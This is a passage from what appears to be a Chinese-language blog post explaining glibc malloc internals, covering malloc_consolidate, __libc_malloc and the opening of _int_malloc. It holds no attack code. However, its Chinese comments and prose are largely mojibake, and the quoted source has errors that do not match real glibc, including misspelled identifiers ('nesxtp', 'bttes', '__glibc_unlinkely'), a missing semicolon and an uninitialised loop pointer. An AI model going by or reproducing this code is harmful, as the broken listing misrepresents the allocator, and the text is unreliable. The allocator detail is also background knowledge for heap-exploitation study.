&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mfastbinptr* fb;					&lt;span class=&#34;comment&#34;&gt;/* current fastbin being consolidated */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mfastbinptr* maxfb;					&lt;span class=&#34;comment&#34;&gt;/* last fastbin (for loop control) */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mchunkptr 	 p;						&lt;span class=&#34;comment&#34;&gt;/* current chunk being consolidated */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mchunkptr    nextp;					&lt;span class=&#34;comment&#34;&gt;/* next chunk to consolidate */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mchunkptr 	 unsorted_bin;			&lt;span class=&#34;comment&#34;&gt;/* bin header */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mchunkptr 	 first_unsorted;		&lt;span class=&#34;comment&#34;&gt;/* chunk to link to */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mchunkptr			nextchunk;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    INTERNAL_SIZE_T		size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    INTERNAL_SIZE_T		nextsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    INTERNAL_SIZE_T		prevsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;					nextinuse;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mchunkptr			bck;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mchunkptr			fwd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* тдѓТъю max_fast СИ║0№╝їт░▒У░Ѓуће malloc_init_state() тЄйТЋ░т»╣ av У┐ЏУАїтѕЮтДІтїќ */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (get_max_fast() != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// ТИЁТЦџ av-&amp;gt;flags ТюЅтЁ│ fast bin уџёТаЄт┐ЌСйЇ№╝їУАеуц║ТЅђТюЅ fast bin жЃйСИ║уЕ║&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        clear_fastchunks(av);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        unsorted_bin = unsorted_chunk(av);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;/* Jт░є fast bin СИГуџё chunk уД╗жЎцт╣Хтљѕт╣Х№╝їуёХтљјТћЙтЁЦ unsorted bin */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        maxfb = &amp;amp;fastbin(av,NFASTBINS - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        fb = &amp;amp;fastbin(av,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt; &amp;#123;					&lt;span class=&#34;comment&#34;&gt;// тєЁт▒ѓтЙфуј»жЂЇтјє fast bin СИГуџёТ»ЈСИђСИф chunk&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            check_inuse_chunk(av,p);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            nextp = p-&amp;gt;fd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            size = p-&amp;gt;size &amp;amp; ~(PREV_INUSE|NON_MAIN_ARENA);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            nextchunk = chunk_at_offset(p,size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            nextsize = chunksize(nextchunk);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!prev_inuse(p)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                prevsize = p-&amp;gt;prev_size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                size += prevsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                p = chunk_at_offset(p,-((&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) prevsize));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                unlink(av,p,bck,fwd);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;// тдѓТъюСИІСИђСИф chunk СИЇТў» top chunk №╝їтљЉтЅЇтљѕт╣Х№╝їт╣ХтіатЁЦ unsorted bin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (nextchunk != av-&amp;gt;top) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                nextinuse = inuse_bit_at_offset(nextchunk,nextsize);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!nextinuse) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    size += nextsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    unlink(av,nextchunk,bck,fwd);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    clear_inuse_bit_at_offset(nextchunk,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                first_unsorted = unsorted_bin-&amp;gt;fd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                unsorted_bin-&amp;gt;fd = p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                first_unsorted-&amp;gt;bk = p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!in_smallbin_range (size)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    p-&amp;gt;fd_nextsize = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    p-&amp;gt;bk_nextsize = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                set_head(p,size | PREV_INUSE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                p-&amp;gt;bk = unsorted_bin;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                p-&amp;gt;fd = first_unsorted;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                set_foot(p,size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;		&lt;span class=&#34;comment&#34;&gt;// тдѓТъюСИІСИђСИф chunk Тў» top chunk№╝їтњї top chunk тљѕт╣Х№╝їтйбТѕљТќ░уџё top chunk&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                size += nextsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                set_head(p,size | PREV_INUSE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                av-&amp;gt;top = p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( (p = nesxtp) != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        malloc_init_state(av);		&lt;span class=&#34;comment&#34;&gt;// malloc тѕЮтДІтїќ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        check_malloc_state(av);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;4-malloc-уЏИтЁ│Т║љуаЂ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-malloc-уЏИтЁ│Т║љуаЂ&#34;&gt;#&lt;/a&gt; 4. malloc () уЏИтЁ│Т║љуаЂ№╝џ&lt;/h2&gt;
&lt;h3 id=&#34;__libc_malloc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#__libc_malloc&#34;&gt;#&lt;/a&gt; __libc_malloc()№╝џ&lt;/h3&gt;
&lt;p&gt;РђІ	тЏаСИ║Сй┐ућеС║єт«Ј strong_alias (__libc_malloc,malloc)№╝їтюе libc Т║љуаЂСИГ malloc () тЄйТЋ░т«ъжЎЁСИіТў» __libc_malloc ()№╝їт«џС╣ЅтдѓСИІ№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; * __libc_malloc (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; bytes) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mstate ar_ptr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *victim;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// У»╗тЈќ __malloc_hook жњЕтГљ№╝їтдѓТъюТюЅжњЕтГљ№╝їтѕЎУ┐љУАїжњЕтГљтЄйТЋ░т╣ХУ┐ћтЏъ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *(*hook) (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt;,&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        = atomic_forced_read (__malloc_hook);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__builtin_expect (hook != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (*hook)(bytes,RETURN_ADDRESS (&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    arena_get (ar_ptr,bytes);				&lt;span class=&#34;comment&#34;&gt;// т»╗ТЅЙСИђСИфтљѕжђѓуџё arena ТЮЦтѕєжЁЇтєЁтГўсђѓ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    victim = _int_malloc (ar_ptr,bytes);	&lt;span class=&#34;comment&#34;&gt;// т░ЮУ»ЋУ░Ѓуће _int_malloc() тѕєжЁЇтєЁтГў&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//  тдѓТъюТ▓АТюЅТЅЙтѕ░тљѕжђѓуџётєЁтГў№╝їт░▒т░ЮУ»ЋТЅЙСИђСИфтЈ»ућеуџё arena (тЅЇТЈљТў» ar_pter != NULL)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!victim &amp;amp;&amp;amp; ar_ptr != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        LIBC_PROBE (memory_malloc_retry,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,bytes);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ar_ptr = arena_get_retry (ar_ptr,bttes);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        victim = _int_malloc (ar_ptr,bytes);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (ar_ptr != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;)				&lt;span class=&#34;comment&#34;&gt;// тдѓТъюућ│У»иС║є arena №╝їУ┐ўжюђУдЂУДБжћЂУ»Ц arena&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;) mutex_unlock (&amp;amp;ar_ptr-&amp;gt;mutex);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           ar_ptr == arena_for_chunk (mem2chunk (victim)));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; victim;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;_int_malloc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#_int_malloc&#34;&gt;#&lt;/a&gt; _int_malloc()№╝џ&lt;/h3&gt;
&lt;p&gt;РђІ	_int_malloc () Тў»тєЁтГўтѕєжЁЇуџёТаИт┐ЃтЄйТЋ░№╝їСИ║С║єС╗ЦТюђт┐ФуџёжђЪт║дТЅЙтѕ░ТюђтљѕжђѓуџётаєтЮЌ№╝їglibc Та╣ТЇ«ућ│У»итаєтЮЌуџётцДсђЂтљёСИф bin уџёуіХТђЂС╗ћу╗єтю░т«ЅТјњС║єтѕєжЁЇжА║т║ЈтњїтєЁтГўТЋ┤уљєтю░ТЌХТю║сђѓтЁХтцДТдѓТљюу┤бжА║т║ЈТў»№╝џ&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;fast bin №╝ѕт»╗ТЅЙтцДт░Јт«їтЁеСИђТаиуџё№╝Ѕ&lt;/li&gt;
&lt;li&gt;small bin №╝ѕт»╗ТЅЙтцДт░Јт«їтЁеСИђТаиуџё№╝Ѕ&lt;/li&gt;
&lt;li&gt;unsorted bin №╝ѕт»╗ТЅЙтцДт░Јт«їтЁеСИђТаиуџё№╝Ѕ&lt;/li&gt;
&lt;li&gt;large bin №╝ѕтдѓТъюућ│У»иУЙЃтцДуџёТў» chunk №╝їт»╗ТЅЙТюђт░ЈУЃйТ╗АУХ│тю░№╝Ѕ&lt;/li&gt;
&lt;li&gt;bins №╝ѕт»╗ТЅЙТюђт░ЈУЃйТ╗АУХ│уџё№╝Ѕ&lt;/li&gt;
&lt;li&gt;top chunk №╝ѕтѕЄтѕєтЄ║тљѕжђѓуџё chunk №╝Ѕ&lt;/li&gt;
&lt;li&gt;у│╗у╗ЪтЄйТЋ░тѕєжЁЇсђѓ&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;РђІ	_int_malloc () тЄйТЋ░тЁиСйЊУ┐ЄуеІтдѓСИІсђѓ&lt;/p&gt;
&lt;p&gt;№╝ѕ1№╝ЅждќтЁѕт«џС╣ЅСИђС║ЏтѕЌТЅђжюђуџётЈўжЄЈ№╝їт╣Хт░єућеТѕиУ»иТ▒ѓуџё bytes УйгтїќСИ║УАеуц║ chunk тцДт░Јуџё nb сђѓтдѓТъюТ▓АТюЅтљѕжђѓуџё arena №╝їт░▒У░Ѓуће sysmalloc () №╝їуће mmap () тѕєжЁЇ chunk т╣ХУ┐ћтЏъсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__glibc_unlinkely (av == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *p = sysmalloc (nb,av);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (p != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        alloc_perturb (p,bytes);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	№╝ѕ2№╝ЅтЁХТгА№╝їТБђТЪЦ fast bin СИГТў»тљдТюЅтљѕжђѓуџё chunk сђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//тдѓТъю nb тюе fast bin УїЃтЏ┤тєЁ№╝їт░▒жђџУ┐Є fast bin тѕєжЁЇ№╝їУ┐ЎТ«хС╗БуаЂтЈ»С╗ЦтюетѕЮтДІтїќС╣ІтЅЇУ┐љУАї&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) (nb) &amp;lt;= (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) (get_max_fast())) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//Та╣ТЇ« nb ТЅЙтљѕжђѓуџё fast bin №╝їfb Тў»ТїЄтљЉт»╣т║ћ fast bin уџёТїЄжњѕ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    idx = fastbin_index (nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mfastbinptr *fb = &amp;amp;fastbin (av,idx);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mchunkptr pp = *fb;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt; &amp;#123;	&lt;span class=&#34;comment&#34;&gt;//тдѓТъю fast bin СИГТюЅ chunk №╝їт░▒т░єтЁХТїЅ LIFO уџёУДётѕЎтЈќтЄ║№╝їтдѓТъюТ▓АТюЅтѕЎУи│У┐Є&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        victim = pp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (victim == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ((pp = catomic_compare_and_exchange_val_acq (fb,victim-&amp;gt;fd,victim))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          != victim);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//тдѓТъю victim != NULL №╝їтѕЎУ»┤ТўјТЅЙтѕ░С║єтљѕжђѓуџё chunk Т▓АТБђТЪЦтљјт░єтЁХУ┐ћу╗ЎућеТѕи&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (victim != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;//ТБђТЪЦТГц chunk тцДт░ЈТў»тљдт║ћтюе fast bin 